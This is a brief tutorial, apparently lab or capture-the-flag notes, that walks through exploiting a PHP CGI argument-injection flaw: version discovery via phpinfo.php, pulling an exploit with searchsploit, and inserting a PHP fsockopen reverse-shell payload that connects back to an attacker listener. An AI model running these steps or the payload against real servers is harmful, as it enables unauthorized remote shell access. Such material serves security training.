
### How to exploit PHP in a web server ?

1. Perform a `-sV` and a `-sC` scan on port 80 of the target.

2. Since the target is running a web server, we'll visit it in our browser for better insight. We cannot tell the PHP version running on the target at first sight. 

3. Sometimes diagnostics or config files pertinent to PHP are left over, one of them is `phpinfo.php` file.  
```
<target-ip>/phpinfo.php
```
- We can figure out the PHP version from this page. 

4. Once we get the PHP version, we can look it up using `searchsploit` to find a relevant exploit. 

5. In our case, the PHP version is vulnerable to CGI Argument Injection. We'll copy the exploit code to our `pwd` using `searchsploit`. 
```
searchsploit -m <EDBID> 
```

6. This exploit code contains a variable `pwn_code` which stores the code which'll be executed when the exploit is run. We'll replace it's value with a reverse shell code. 
```
$sock=fsockopen("IP",1234);exec("/bin/sh -i <&4 >&4 2>&4");
```
- This PHP reverse shell connect to our listener. Replace `IP` with your local IP.
- The code should be in the format `"""<? code ?>"""` to preserve the syntax. 

7. Setup a `nc` listener on the port set in the exploit code. 

8. Now we will run the modified exploit code. 
```
python2 18836.py <target-ip> 80
```

9. This will give us a reverse shell access. 
